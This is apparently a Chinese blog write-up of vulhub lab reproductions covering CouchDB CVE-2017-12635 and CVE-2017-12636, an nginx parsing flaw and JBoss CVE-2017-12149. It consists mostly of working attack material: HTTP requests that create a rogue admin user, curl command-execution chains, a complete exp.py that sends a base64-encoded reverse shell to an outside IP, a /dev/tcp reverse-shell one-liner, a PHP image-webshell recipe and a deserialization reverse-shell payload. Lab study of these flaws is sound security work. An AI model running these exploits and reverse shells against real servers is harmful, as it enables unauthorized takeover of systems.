---
layout: post
title: "vulhub漏洞复现"
date: 2019-6-10 20:49:43
author: co0ontty
categories: 漏洞复现 WEB ALL
tags: 漏洞复现 WEB ALL 
cover: 'https://i.loli.net/2019/06/10/5cfe32a6be6cf32080.png'
---

## Couchdb 垂直权限绕过漏洞（CVE-2017-12635）

`Path:couchdb/CVE-2017-12635`

### 漏洞复现：

#### 发送创建用户的请求包

```textile
PUT /_users/org.couchdb.user:username HTTP/1.1

Host: your-ip:5984

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Content-Type: application/json

Content-Length: 96

{

  "type": "user",

  "name": "username",

  "roles": ["_admin"],

  "password": "password"

}
```

服务器返回错误，仅允许admin用户添加用户

![5cfe35326689f17529](https://i.loli.net/2019/06/10/5cfe35326689f17529.png)

重复发送roles参数，成功绕过限制，创建用户

```textile
PUT /_users/org.couchdb.user:username HTTP/1.1

Host: your-ip:5984

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Content-Type: application/json

Content-Length: 111

{

  "type": "user",

  "name": "username",

  "roles": ["_admin"],

  "roles":[],

  "password": "password"
}
```

成功创建用户

![5cfe365ebd34e80865](https://i.loli.net/2019/06/10/5cfe365ebd34e80865.png)

登陆成功 

![5cfe364f25d8a64339](https://i.loli.net/2019/06/10/5cfe364f25d8a64339.png)

## Couchdb 任意命令执行漏洞（CVE-2017-12636）

### 漏洞复现：

#### Version 1.6.0

在CVE-2017-12635的基础上进行任意命令执行操作

```textile
curl -X PUT 'http://co0ontty:password@your-ip:5984/_config/query_servers/cmd' -d '"id >/tmp/success"'

curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest'
curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
curl -X POST 'http://co0ontty:password@your-ip:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'
```

其中 co0ontty:password为用户名和密码

第一个请求是添加一个名字为`cmd`的`query_servers`，其中`id >/tmp/success`为后面要执行的命令

第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。

第四个请求就是在这个Database里进行查询，因为我将language设置为`cmd`，这里就会用到我第一步里添加的名为`cmd`的`query_servers`，最后触发命令执行。

#### Version 2.1.0

Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问`/_membership`即可：

第一个请求修改为：

```textile
curl -X PUT http://co0ontty:password@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '"id >/tmp/success"'
```

第二、三个请求不变：

```textile
curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest'

curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
```

由于Couchdb 2.x删除了`_temp_view`，所以我们为了触发`query_servers`中定义的命令，需要添加一个`_view`：

第四个请求修改为：

```textile
curl -X PUT http://co0ontty:password@your-ip:5984/vultest/_design/vul -d '{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H "Content-Type: application/json"
```

增加`_view`的同时即触发了`query_servers`中的命令。

也可以使用python将这一过程连贯运行，并得到反弹shell的效果

补充：

linux环境下可以通过下面这个命令实现反弹shell

```textile
sh -i >& /dev/tcp/47.102.143.147/222 0>&1
```

/dev/[tcp|upd]/host/port是Linux设备里面比较特殊的文件，读取或写入相当于建立socket调用 
由于其特殊性，命令执行后依旧无法找到/dev/tcp目录更不要说下面的文件了  
注意，这里"&"在Linux shell中表示后台运行，当然这里0>&1不是这样,对于&1更准确的说应该是文件描述符1,而1一般代表的就是STDOUT_FILENO

2>&1形式用于重定向，2>表示错误重定向，&1表示标准输出；以ls >/dev/null 2>&1为例，2>&1是将标准出错重定向到标准输出，不过在这里又被重定向到了/dev/null这个无底洞里
这里有一个问题：为什么2>&1要写在后面，以command >file 2>&1为例，首先是command > file将标准输出重定向到file中， 2>&1 是标准错误拷贝了标准输出的行为，也就是同样被重定向到file中，最终结果就是标准输出和错误都被重定向到file中 
其实还有一个问题，既然2>表示错误重定向，那么0>表示什么呢？查阅资料发现在Linux下输入输出重定向有三个值，其中2已经说过是标准错误信息输出，那0则是标准输入，1则为标准输出了。说到这里，其实又引出了一个新的问题，我们知道<才是表示输入的，那为何这里却是如此形式，按说就应该是2了，或者说这里0就已经是输入了，然后直接使用>进行输出，不是很清楚请大牛指点啊

exp.py:

```python
#!/usr/bin/env python3
import requests
import json
import base64
from requests.auth import HTTPBasicAuth

target = 'http://47.102.143.147:5984'
command = rb"""sh -i >& /dev/tcp/47.102.143.147/222 0>&1"""
version = 2

session = requests.session()
session.headers = {
    'Content-Type': 'application/json'
}
# session.proxies = {
#     'http': 'http://127.0.0.1:8085'
# }
session.put(target + '/_users/org.couchdb.user:co0ontty', data='''{
  "type": "user",
  "name": "co0ontty",
  "roles": ["_admin"],
  "roles": [],
  "password": "co0ontty"
}''')

session.auth = HTTPBasicAuth('co0ontty', 'co0ontty')
# print (session.auth)
command = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command).decode()
# print (command)
if version == 1:
    session.put(target + ('/_config/query_servers/cmd'), data=json.dumps(command))
else:
    host = session.get(target + '/_membership').json()['all_nodes'][0]
    session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command))

session.put(target + '/co0ontty')
session.put(target + '/co0ontty/test', data='{"_id": "id"}')

if version == 1:
    session.post(target + '/co0ontty/_temp_view?limit=10', data='{"language":"cmd","map":""}')
else:
    session.put(target + '/co0ontty/_design/test', data='{"_id":"_design/test","views":{"co0ontty":{"map":""} },"language":"cmd"}')
```

## NGINX解析漏洞

`Path:nginx/nginx_parsing_vulnerability`

漏洞成因：用户配置不当造成的解析漏洞。

### 漏洞复现：

![5cffa56981f5625236](https://i.loli.net/2019/06/11/5cffa56981f5625236.png)

制作php的图片马进行上传，利用解析漏洞将图片马当做php解析并运行。

```php
<?phpinfo()?>
```

```powershell
copy 1.jpg /a + shell.php /b shell.jpg
```

上传图片马，获得上传后的文件物理路径，访问相应的web路径（[http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg](http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg)）获得图片

![5cffa665698a720426](https://i.loli.net/2019/06/11/5cffa665698a720426.png)

利用解析漏洞访问（[http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg/.php](http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg/.php)）成功解析图片为php

![5cffa7499b31532778](https://i.loli.net/2019/06/11/5cffa7499b31532778.png)

## JBoss 5.x/6.x 反序列化漏洞 （CVE-2017-12149）

`Path:jboss/CVE-2017-12149`

漏洞成因：该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。

在`/invoker/readonly`请求中，服务器将用户提交的POST内容进行了Java反序列化

![5d005ee4c701964038](https://i.loli.net/2019/06/12/5d005ee4c701964038.png)

使用常规的Java反序列化漏洞的测试方法来复现该漏洞。

### 漏洞复现：

使用Java反序列化利用工具JavaDeserH2HC.zip（http://scan.javasec.cn/java/JavaDeserH2HC.zip） 生成poc.ser

```powershell
#编译运行
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
#生成shell反弹poc
java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 47.102.143.147:222
使用curl向服务器发送POST请求（@filename,从文件中读取数据（包括换行符），将读取的数据进行URL编码，然后发送给HTTP服务器）
curl http://47.102.143.147:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![5d00edd1279f283233](https://i.loli.net/2019/06/12/5d00edd1279f283233.png)


